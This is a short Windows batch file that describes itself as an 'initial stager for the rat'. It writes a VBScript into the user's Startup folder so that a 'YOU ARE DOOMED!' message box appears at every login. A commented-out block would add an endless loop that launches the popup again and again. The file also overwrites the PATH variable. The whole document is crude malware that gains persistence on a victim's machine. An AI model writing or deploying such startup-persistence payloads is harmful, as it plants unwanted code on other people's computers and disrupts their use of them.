@echo off

@rem initial stager for the rat


@rem variables
path = C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup


@rem write the payload to startup
(echo MsgBox "YOU ARE DOOMED!" ^& vbCrLf ^& "NOT WORTH IT", vbOkOnly+vbExclamation+vbDefaultButton1, "TITLE")>%path%/popup.vbs

@REM (
@REM     echo @echo off
@REM     echo :loop
@REM     echo start /min cmd /c "popup.vbs"
@REM     echo goto loop
@REM )>payload.cmd

